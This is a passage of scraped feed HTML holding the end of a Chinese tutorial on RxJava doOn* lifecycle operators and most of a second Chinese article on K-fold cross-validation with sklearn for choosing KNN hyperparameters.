<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.error(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"测试错误"</span>))
                .doOnError(error -&gt;
                        System.err.println(<span class="hljs-string">"捕获到错误: "</span> + error.getMessage())
                )
                .onErrorReturnItem(<span class="hljs-string">"默认值"</span>)
                .subscribe();

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 捕获到错误: 测试错误</span>
    }
</code></pre>
<h4 data-id="heading-54">doOnComplete - 完成时</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"任务1"</span>, <span class="hljs-string">"任务2"</span>)
                .doOnComplete(() -&gt;
                        System.out.println(<span class="hljs-string">"所有任务都完成了！"</span>)
                )
                .subscribe();

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 所有任务都完成了！</span>
    }
</code></pre>
<h4 data-id="heading-55">doOnTerminate - 完成/错误前执行</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 正常完成的情况</span>
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .doOnTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"即将完成/出错"</span>)
                )
                .doOnComplete(() -&gt;
                        System.out.println(<span class="hljs-string">"doOnComplete"</span>)
                )
                .subscribe(
                        item -&gt; System.out.println(<span class="hljs-string">"接收: "</span> + item),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"onComplete"</span>)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 接收: A</span>
        <span class="hljs-comment">// 接收: B</span>
        <span class="hljs-comment">// 即将完成/出错</span>
        <span class="hljs-comment">// doOnComplete</span>
        <span class="hljs-comment">// onComplete</span>

        <span class="hljs-comment">// 出错的情况</span>
        Observable.error(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"测试"</span>))
                .doOnTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"即将完成/出错"</span>)
                )
                .doOnError(error -&gt;
                        System.out.println(<span class="hljs-string">"doOnError: "</span> + error.getMessage())
                )
                .subscribe(
                        item -&gt; {
                        },
                        error -&gt; System.out.println(<span class="hljs-string">"onError: "</span> + error.getMessage())
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 即将完成/出错</span>
        <span class="hljs-comment">// doOnError: 测试</span>
        <span class="hljs-comment">// onError: 测试</span>

    }
</code></pre>
<h4 data-id="heading-56">doAfterTerminate - 完成/错误后执行</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 正常完成的情况</span>
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>)
                .doAfterTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"完成/出错后执行"</span>)
                )
                .doOnComplete(() -&gt;
                        System.out.println(<span class="hljs-string">"doOnComplete"</span>)
                )
                .subscribe(
                        item -&gt; System.out.println(<span class="hljs-string">"接收: "</span> + item),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"onComplete"</span>)
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 接收: A</span>
        <span class="hljs-comment">// 接收: B</span>
        <span class="hljs-comment">// doOnComplete</span>
        <span class="hljs-comment">// onComplete</span>
        <span class="hljs-comment">// 完成/出错后执行</span>

        <span class="hljs-comment">// 出错的情况</span>
        Observable.error(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"测试"</span>))
                .doAfterTerminate(() -&gt;
                        System.out.println(<span class="hljs-string">"完成/出错后执行"</span>)
                )
                .doOnError(error -&gt;
                        System.out.println(<span class="hljs-string">"doOnError: "</span> + error.getMessage())
                )
                .subscribe(
                        item -&gt; {
                        },
                        error -&gt; System.out.println(<span class="hljs-string">"onError: "</span> + error.getMessage())
                );

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// doOnError: 测试</span>
        <span class="hljs-comment">// onError: 测试</span>
        <span class="hljs-comment">// 完成/出错后执行</span>
    }
</code></pre>
<h4 data-id="heading-57">doOnDispose - 取消订阅时</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Disposable</span> <span class="hljs-variable">disposable</span> <span class="hljs-operator">=</span> Observable.interval(<span class="hljs-number">1</span>, TimeUnit.SECONDS)
                .doOnDispose(() -&gt;
                        System.out.println(<span class="hljs-string">"订阅被取消了"</span>)
                )
                .subscribe(num -&gt;
                        System.out.println(<span class="hljs-string">"计数: "</span> + num)
                );

        Thread.sleep(<span class="hljs-number">3500</span>);
        disposable.dispose();

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 计数: 0</span>
        <span class="hljs-comment">// 计数: 1</span>
        <span class="hljs-comment">// 计数: 2</span>
        <span class="hljs-comment">// 订阅被取消了</span>
    }
</code></pre>
<h4 data-id="heading-58">doFinally - 最终执行</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"数据"</span>)
                .doFinally(() -&gt;
                        System.out.println(<span class="hljs-string">"无论如何都会执行"</span>)
                )
                .subscribe();

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 无论如何都会执行</span>
    }
</code></pre>
<h4 data-id="heading-59">doOnEach - 每个事件时</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Observable.just(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)
                .doOnEach(notification -&gt; {
                    <span class="hljs-keyword">if</span> (notification.isOnNext()) {
                        System.out.println(<span class="hljs-string">"发射: "</span> + notification.getValue());
                    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (notification.isOnComplete()) {
                        System.out.println(<span class="hljs-string">"完成"</span>);
                    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (notification.isOnError()) {
                        System.out.println(<span class="hljs-string">"错误: "</span> + notification.getError());
                    }
                })
                .subscribe();

        <span class="hljs-comment">// 输出：</span>
        <span class="hljs-comment">// 发射: A</span>
        <span class="hljs-comment">// 发射: B</span>
        <span class="hljs-comment">// 发射: C</span>
        <span class="hljs-comment">// 完成</span>
    }
</code></pre>
<h4 data-id="heading-60">doOnRequest - 请求时（背压相关）</h4>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        Flowable.range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)
                .doOnRequest(requested -&gt;
                        System.out.println(<span class="hljs-string">"下游请求了 "</span> + requested + <span class="hljs-string">" 个元素"</span>)
                )
                .subscribe(
                        num -&gt; System.out.println(<span class="hljs-string">"接收: "</span> + num),
                        error -&gt; {
                        },
                        () -&gt; System.out.println(<span class="hljs-string">"完成"</span>)
                );

    }
</code></pre>
<h2 data-id="heading-61">结束</h2>
<p>响应式编程确实需要一些时间来掌握，但一旦理解核心概念，你就会发现它在处理异步数据流时的强大之处。</p>
<p>从回调地狱到流畅的链式调用，从手忙脚乱的资源管理到智能的背压控制，响应式编程让复杂异步操作变得清晰可控。虽然学习曲线存在，但投入是值得的。</p>
<p>记住，不是所有场景都需要响应式。在合适的业务场景下使用，才能发挥最大价值。建议从实际项目的小模块开始尝试，逐步积累经验。</p>
<p>希望这篇内容能为你打开响应式编程的大门。编程之路就是不断学习的过程，保持好奇，继续探索吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-197 K折交叉验证实战：sklearn 看均值/方差，选更稳的 KNN 超参]]></title>    <link>https://juejin.cn/post/7588300640599900166</link>    <guid>https://juejin.cn/post/7588300640599900166</guid>    <pubDate>2025-12-28T13:55:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588300640599900166" data-draft-id="7588680081326735402" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-197 K折交叉验证实战：sklearn 看均值/方差，选更稳的 KNN 超参"/> <meta itemprop="keywords" content="后端,大数据,机器学习"/> <meta itemprop="datePublished" content="2025-12-28T13:55:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大数据-197 K折交叉验证实战：sklearn 看均值/方差，选更稳的 KNN 超参
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T13:55:17.000Z" title="Sun Dec 28 2025 13:55:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：同一模型多次训练评估波动大，单次划分不可信，K 值难定</li>
<li>结论：用 K 折交叉验证看“平均分 + 方差”，优先选高均值且方差小的区间</li>
<li>产出：一套可复用的 cross_val_score 流程 + 结合学习曲线的稳定性选参方法</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/efcd037c5153436caa1224825c15bc86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=RbiFT1JvrmxM5K3Qtnt4lFi078k%3D" alt="大数据-197 K折交叉验证实战：sklearn 看均值/方差，选更稳的 KNN 超参" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5877cbd48a0d4469b025210929be161e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=emQMGSbbqgIUYGPn60O9oSwfTuY%3D" alt="大数据-197 K折交叉验证实战：sklearn 看均值/方差，选更稳的 KNN 超参" loading="lazy"/></p>
<h2 data-id="heading-1">交叉验证</h2>
<p>确定了 K 值之后，我们还能够观察到一个重要现象：每次运行模型时，学习曲线都会发生变化，模型的效果时好时坏，呈现出不稳定性。这种波动现象主要是由以下原因造成的：</p>
<ol>
<li>
<p><strong>数据集划分的随机性</strong>：</p>
<ul>
<li>每次运行时，训练集和测试集的划分方式不同（通常是通过随机采样）</li>
<li>举例来说，假设我们有1000条数据，第一次可能随机选取700条作为训练集，剩下的300条作为测试集；第二次运行时，这个划分组合又会发生变化</li>
</ul>
</li>
<li>
<p><strong>数据分布的影响</strong>：</p>
<ul>
<li>不同的训练集会学到略微不同的模式</li>
<li>测试集的不同组成会导致评估指标波动</li>
<li>例如，如果某次测试集中恰好包含较多边界案例，模型表现就会较差</li>
</ul>
</li>
</ol>
<p>在实际业务场景中，这种情况反映了几个关键问题：</p>
<ol>
<li>
<p><strong>历史数据与新数据的差异</strong>：</p>
<ul>
<li>训练数据通常是静态的历史数据</li>
<li>测试数据则模拟未来新进入系统的实时数据</li>
<li>在电商推荐系统中，用过去3个月的订单数据训练，但需要预测未来一周的购买行为</li>
</ul>
</li>
<li>
<p><strong>模型评估的核心目标</strong>：</p>
<ul>
<li>我们追求的是模型在未知数据上的表现</li>
<li>这种能力被称为泛化能力(Generalization Ability)</li>
<li>好的泛化能力意味着：
<ul>
<li>对噪声数据保持鲁棒性</li>
<li>能处理未见过的数据模式</li>
<li>避免过拟合训练数据的特定特征</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>提高泛化能力的方法</strong>：</p>
<ul>
<li>使用交叉验证代替单次划分</li>
<li>增加数据多样性</li>
<li>采用正则化技术</li>
<li>例如，在金融风控模型中，会使用5折交叉验证来更可靠地评估模型效果</li>
</ul>
</li>
</ol>
<p>这种现象提醒我们，在模型开发过程中不能仅依赖单次运行的评估结果，而需要通过多次验证来获得稳定的性能评估，这才是保证模型在实际业务中可靠表现的关键。</p>
<h3 data-id="heading-2">泛化能力</h3>
<p>我们在进行学习的时候，通常会将一个样本集分化为【训练集】和【测试集】，其中训练集用于模型的学习和训练，而后测试集通常用于评估训练好的模型对于数据的预测性的评估。</p>
<ul>
<li>训练误差代表模型在训练集上的错分样本比率。</li>
<li>测试误差代表模型在测试集上的错分样本比率。</li>
</ul>
<p>训练误差的大小，用来判断给定问题是不是一个容易学习的问题，测试误差反应了模型对未知数据的预测能力，测试误差小的学习方法具有很好的预测能力，如果得到的训练集和测试集没有交集，通常将此预测能力称为泛化能力（generalization ability）。
我们认为，如果模型在一套训练集和数据集上表现优秀，那说明不了问题，只能在众多不同的训练集和测试集上都表现优秀，模型才是一个稳定的模型，模型才是具有真正意义上的泛化能力。
为此，机器学习领域有发挥神作用的技能：【交叉验证】，来帮助我们认识模型。</p>
<h3 data-id="heading-3">k折交叉验证</h3>
<p>最常用的交叉验证方法是 K 折交叉验证（K-Fold Cross Validation）。这种方法通过将数据集划分为 K 个大小相似的互斥子集，每次使用其中 K-1 个子集作为训练数据，剩下的 1 个子集作为验证数据，重复这个过程 K 次，最终得到 K 个模型评估结果的平均值。</p>
<p>具体步骤如下：</p>
<ol>
<li>将原始数据集随机划分为 K 个等大小的子集（通常 K=5 或 10）</li>
<li>依次选取第 i 个子集作为验证集（i=1,2,...,K），其余 K-1 个子集合并作为训练集</li>
<li>在训练集上训练模型，在验证集上评估模型性能</li>
<li>重复步骤 2-3 直到所有子集都充当过验证集</li>
<li>计算 K 次评估结果的平均值作为最终模型性能指标</li>
</ol>
<p>这种方法相比简单的训练集-测试集划分具有以下优势：</p>
<ul>
<li>充分利用有限的数据资源</li>
<li>减少数据划分带来的随机性影响</li>
<li>提供更可靠的模型性能评估</li>
<li>特别适用于中小规模数据集</li>
</ul>
<p>实际应用中，K 值的选择需要权衡：</p>
<ul>
<li>较小的 K 值（如 5）计算效率更高</li>
<li>较大的 K 值（如 10）评估结果更稳定</li>
<li>极端情况 K=N（样本数）时即为留一法交叉验证</li>
</ul>
<p>通过多次交叉验证求取均值，可以显著降低单次数据划分带来的评估偏差，为模型选择和参数调优提供更可靠的依据。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6725d7d8524940d5aacc8aa4cc8731fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=9qFpGDOrsAgN4eB9lt8v2zeYFAc%3D" alt="交叉验证多次测试" loading="lazy"/></p>
<h3 data-id="heading-4">带交叉验证的学习曲线</h3>
<p>对于带交叉验证的学习曲线，我们需要观察的就不仅仅是最高的准确率了，而是准确率高且方差还相对较小的点，这样的点泛化能力才是最强的，在交叉验证+学习曲线的作用下，我们选出的超参数能够保证更好的泛化能力。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> cross_val_score <span class="hljs-keyword">as</span> CVS
Xtrain,Xtest,Ytrain,Ytest = train_test_split(X,y,test_size=<span class="hljs-number">0.2</span>,random_state=<span class="hljs-number">420</span>)
clf = KNeighborsClassifier(n_neighbors=<span class="hljs-number">8</span>)
<span class="hljs-comment">#训练集对折6次，一共6个预测率输出</span>
cvresult = CVS(clf,Xtrain,Ytrain,cv=<span class="hljs-number">6</span>) 
<span class="hljs-comment">#每次交叉验证运行时估算器得分的数组</span>
cvresult 
</code></pre>
<p>执行结果如下：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28755e02a4ad4c0aa4fbc0e970e2ebfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=H1PotusTQW5RO6YsE%2BjyCirbOuM%3D" alt="sklearn 交叉验证" loading="lazy"/>
查看均值、方差</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 均值：查看模型的平均效果</span>
cvresult.mean()
<span class="hljs-comment"># 方差：查看模型是否稳定</span>
cvresult.var()
</code></pre>
<p>执行结果如下所示：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45852d79695c49208d1c3dc5ad468218~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=B6hZRxC%2F9%2FJ3Z8M3EXnsPWVvh5k%3D" alt="交叉验证 均值 方差" loading="lazy"/>
绘制图片进行查看：</p>
<pre><code class="hljs language-python" lang="python">score = []
var = []
<span class="hljs-comment">#设置不同的k值，从1到19都看看</span>
krange=<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>) 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> krange:
    clf = KNeighborsClassifier(n_neighbors=i)
    cvresult = CVS(clf,Xtrain,Ytrain,cv=<span class="hljs-number">5</span>)
    <span class="hljs-comment"># 每次交叉验证返回的得分数组，再求数组均值</span>
    score.append(cvresult.mean()) 
    var.append(cvresult.var())

plt.plot(krange,score,color=<span class="hljs-string">'k'</span>)
plt.plot(krange,np.array(score)+np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
plt.plot(krange,np.array(score)-np.array(var)*<span class="hljs-number">2</span>,c=<span class="hljs-string">'red'</span>,linestyle=<span class="hljs-string">'--'</span>)
</code></pre>
<p>运行结果如下：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8be8e44493a40d08f38d05e7f452741~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=FPWGqCC%2F99fkzRyM5tYDXs5S24U%3D" alt="交叉验证 绘制图表" loading="lazy"/>
输出的图片如下所示：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a31efbd475df465fa99805cc34464dac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=etZQhBlifC%2Br4dkFH%2FfZILdRHsc%3D" alt="交叉验证 绘制图表" loading="lazy"/></p>
<h3 data-id="heading-5">是否需要验证集</h3>
<p>最标准，最严谨的交叉验证应该有三组数据：训练集、验证集和测试集。当我们获取一组数据之后：</p>
<ul>
<li>先将数据集分成整体的训练集和测试集</li>
<li>然后我们把训练集放入交叉验证中</li>
<li>从训练集中分割更小的训练集（k-1 份）和验证机（1 份）</li>
<li>返回的交叉验证结果其实是验证集上的结果</li>
<li>使用验证集寻找最佳参数，确认一个我们认为泛化能力最佳的模型</li>
<li>将这个模型使用在测试集上，观察模型的表现</li>
</ul>
<p>通常来说，我们认为经过验证集找出最终参数后的模型的泛化能力是增强了的，因此模型在未知数据（测试集）上的效果会更好，但尴尬的是，模型经过交叉验证在验证集上的调参之后，在测试集上的结果没有变好的情况时有发生。</p>
<p>原因其实是：</p>
<ul>
<li>我们自己分的训练集和测试集，会影响模型的效果</li>
<li>交叉验证后的模型的泛化能力增强了，表现它在未知数据集上方差更小，平均水平更高，但却无法保证它在现在分出来的测试集上预测能力最强</li>
<li>如此来说，是否有测试集的存在，其实意义不大</li>
</ul>
<p>如果我们相信交叉验证的调整结果是增强了模型的泛化能力，那即便测试集上的测试结果并没有变好（甚至变坏），我们也认为模型是成功的。
如果我们不相信交叉验证的调整结果能够增强模型的泛化能力，而一定要依赖测试集来进行判断，我们完全没有进行交叉验证的必要，直接用测试集上的结果用来跑学习曲线就好了。
所以，究竟是否需要验证集，其实是存在争议的，在严谨的情况下，大家还是使用了有验证集的方式。</p>
<h3 data-id="heading-6">其他交叉验证</h3>
<p>交叉验证的方法不止“K 折”一种，分割训练集和测试集的方法也不止一种，分门别类的交叉验证占据了 sklearn 中非常长的一章。
所有的交叉验证都是在分割训练集和测试集，只不过侧重的方向不同。</p>
<ul>
<li>K 折就是按顺序取训练集和测试集</li>
<li>ShuffleSpilt 就侧重于让测试集分布在数据的全方位之内</li>
<li>StratifiedKFold 则认为训练数据和测试数据必须在每个标签分类中占有相同的比例</li>
</ul>
<p>各类交叉验证的原理繁琐，大家在机器学习的道路上一定会逐渐遇到更难的交叉验证，但是万变不离其宗：本质上交叉验证是为了解决训练集和测试集的划分对模型带来的影响，同时检测模型的泛化能力。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58ab85d1c5724f38afc0f9727862bda7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767534916&amp;x-signature=sR9WWcEJBKx5S80nmKCVHA6CmIg%3D" alt="各类交叉验证" loading="lazy"/></p>
<p>交叉验证的折数不可太大，因为折数越大抽出来的数据集越小，训练数据所带来的信息量就会越小，模型会越来越不稳定。</p>
<h3 data-id="heading-7">避免折数太大</h3>
<p>如果你发现不使用交叉验证的时候模型表现很好，一使用校验验证模型的效果就骤降</p>
<ul>
<li>一定要查看你的标签是否有顺利</li>
<li>然后就是查看你的数据量是否太小，折数是否太高</li>
</ul>
<p>如果将上面例题的代码中将 cv 将 5 改成 100，代码如下所示：</p>
<pre><code class="hljs language-python" lang="python">score = []
var = []
<span class="hljs-comment">#设置不同的k值，从1到19都看看</span>
krange=<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>) 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> krange:
    clf = KNeighborsClassifier(n_neighbors=i)
    cvresult = CVS(clf,Xtrain,Ytrain,cv=<span class="hljs-number">100</span>)
    <span class="hljs-comment"># 每次交叉验证返回的得分数组，再求数组均值</span>
